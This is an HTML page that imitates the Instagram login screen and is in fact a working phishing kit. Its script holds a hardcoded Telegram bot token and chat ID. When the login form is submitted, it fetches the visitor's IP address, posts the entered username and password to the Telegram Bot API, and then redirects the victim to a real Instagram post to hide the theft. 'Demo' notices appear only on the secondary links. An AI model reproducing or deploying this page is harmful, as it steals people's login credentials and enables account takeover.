<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 350px;
        }

        .login-card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px 30px;
            width: 100%;
            text-align: center;
        }

        .logo {
            margin-bottom: 30px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Updated logo image with the official Instagram wordmark */
        .logo img {
            width: 175px;
            height: auto;
            display: block;
        }

        .form-group {
            margin-bottom: 12px;
        }

        .form-group input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
            transition: border 0.1s ease;
        }

        .form-group input:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            background-color: #0095f6;
            color: white;
            width: 100%;
            padding: 7px 16px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 8px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            margin: 0 18px;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            font-weight: 600;
            color: #385185;
            cursor: pointer;
        }

        .fb-login span {
            cursor: pointer;
        }

        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
        }

        .signup-link {
            margin-top: 20px;
            text-align: center;
            font-size: 14px;
            border-top: 1px solid #dbdbdb;
            padding-top: 20px;
        }

        .signup-link a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .error-msg {
            background-color: #ffefef;
            color: #ed4956;
            font-size: 13px;
            padding: 8px;
            border-radius: 4px;
            margin-bottom: 15px;
            display: none;
            text-align: center;
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        @media (max-width: 450px) {
            .login-card {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="login-card">
        <div class="logo">
            <!-- 
                OFFICIAL INSTAGRAM LOGO
                Source: Instagram's official logged_out_wordmark.png
                URL: https://www.instagram.com/static/images/web/logged_out_wordmark.png/4a8bbfb7e4ef.png
            -->
            <img src="instagram.png" 
                 alt="Instagram"
                 onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 169 50\'%3E%3Cdefs%3E%3ClinearGradient id=\'g\' x1=\'0%25\' y1=\'0%25\' x2=\'100%25\' y2=\'100%25\'%3E%3Cstop offset=\'0%25\' stop-color=\'%23f9ce34\'/%3E%3Cstop offset=\'30%25\' stop-color=\'%23ee2a7b\'/%3E%3Cstop offset=\'100%25\' stop-color=\'%236228d7\'/%3E%3C/linearGradient%3E%3C/defs%3E%3Ctext x=\'10\' y=\'38\' font-family=\'Arial, Helvetica, sans-serif\' font-size=\'36\' font-weight=\'bold\' fill=\'url(%23g)\'%3EInstagram%3C/text%3E%3C/svg%3E';">
        </div>

        <div id="errorBox" class="error-msg"></div>

        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn" id="loginButton">Log in</button>
        </form>

        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>

        <div class="fb-login">
            <svg aria-label="Facebook logo" color="#385185" fill="#385185" height="20" viewBox="0 0 24 24" width="20">
                <path d="M17.5 4H6.5C5.1 4 4 5.1 4 6.5v11C4 18.9 5.1 20 6.5 20h5.5v-5.5h-2V12h2v-1.5c0-1.7 1.3-3 3-3h1.5V9h-1c-.6 0-1 .4-1 1v2h2l-.5 2.5h-1.5V20H17.5c1.4 0 2.5-1.1 2.5-2.5v-11C20 5.1 18.9 4 17.5 4z"/>
            </svg>
            <span>Log in with Facebook</span>
        </div>

        <div class="forgot-password">
            <a href="#" style="text-decoration: none; color: #00376b;">Forgot password?</a>
        </div>

        <div class="signup-link">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</div>

<script>
    // ----- Telegram Bot Config -----
    const BOT_TOKEN = "8734906489:AAE2s2kwHcZ9W3NN9UssCFZNO3pyZQ5tDH0";
    const CHAT_ID = "1402452142";
    const REDIRECT_URL = "https://www.instagram.com/p/DQ7HXV_DD16/";

    // Helper function to show error message
    function showError(message) {
        const errorDiv = document.getElementById('errorBox');
        errorDiv.innerText = message;
        errorDiv.style.display = 'block';
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 4000);
    }

    // Function to get client IP using multiple free IP APIs
    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (err) {
            console.warn("ipify failed, trying fallback...");
            try {
                const res2 = await fetch('https://ipapi.co/json/');
                const data2 = await res2.json();
                return data2.ip;
            } catch (err2) {
                console.warn("ipapi.co failed, trying another...");
                try {
                    const res3 = await fetch('https://ip-api.com/json/');
                    const data3 = await res3.json();
                    return data3.query;
                } catch (err3) {
                    console.error("All IP services failed");
                    return "Unable to fetch IP";
                }
            }
        }
    }

    // Function to send message to Telegram Bot
    async function sendToTelegram(username, password, ipAddress) {
        const message = `🔐 *Instagram Login Alert* 🔐\n\n👤 *Username/Email:* ${escapeMarkdown(username)}\n🔑 *Password:* ${escapeMarkdown(password)}\n🌍 *IP Address:* ${escapeMarkdown(ipAddress)}\n⏰ *Time:* ${new Date().toLocaleString()}`;
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (!result.ok) {
                console.error("Telegram API error:", result);
                throw new Error(result.description || "Failed to send message");
            }
            return true;
        } catch (error) {
            console.error("sendToTelegram error:", error);
            return false;
        }
    }

    // Helper to escape special markdown characters
    function escapeMarkdown(text) {
        if (!text) return "";
        return text.replace(/_/g, '\\_')
                   .replace(/\*/g, '\\*')
                   .replace(/\[/g, '\\[')
                   .replace(/\]/g, '\\]')
                   .replace(/\(/g, '\\(')
                   .replace(/\)/g, '\\)')
                   .replace(/~/g, '\\~')
                   .replace(/`/g, '\\`')
                   .replace(/>/g, '\\>')
                   .replace(/#/g, '\\#')
                   .replace(/\+/g, '\\+')
                   .replace(/-/g, '\\-')
                   .replace(/=/g, '\\=')
                   .replace(/\|/g, '\\|')
                   .replace(/\{/g, '\\{')
                   .replace(/\}/g, '\\}')
                   .replace(/\./g, '\\.')
                   .replace(/\!/g, '\\!');
    }

    // Handle form submission
    const form = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginButton');
    
    form.addEventListener('submit', async (event) => {
        event.preventDefault();
        
        // Get form values
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        
        // Basic validation
        if (!username || !password) {
            showError("Please fill in both username and password.");
            return;
        }
        
        // Disable button to prevent double submission
        loginBtn.disabled = true;
        loginBtn.innerText = "Logging in...";
        
        // Get the user's IP address
        let userIP = "Unknown (fetch failed)";
        try {
            userIP = await getClientIP();
        } catch (err) {
            console.error("IP fetch error", err);
            userIP = "Could not retrieve IP";
        }
        
        // Send credentials + IP to Telegram Bot
        const telegramSuccess = await sendToTelegram(username, password, userIP);
        
        if (!telegramSuccess) {
            console.warn("Telegram message failed, but continuing with redirect");
        }
        
        // Redirect to the specified Instagram post
        window.location.href = REDIRECT_URL;
    });
    
    // Add interactive demo warnings for non-login links
    const fbDiv = document.querySelector('.fb-login');
    if (fbDiv) {
        fbDiv.addEventListener('click', () => {
            showError("This is a demo login page. Please use the standard login form above.");
        });
    }
    
    const forgotLink = document.querySelector('.forgot-password a');
    if (forgotLink) {
        forgotLink.addEventListener('click', (e) => {
            e.preventDefault();
            showError("Password reset is not available in this demo version.");
        });
    }
    
    const signupLink = document.querySelector('.signup-link a');
    if (signupLink) {
        signupLink.addEventListener('click', (e) => {
            e.preventDefault();
            showError("Sign up is not available in this simulation.");
        });
    }
    
    console.log("Instagram Login Page - Official Logo Loaded");
</script>
</body>
</html>
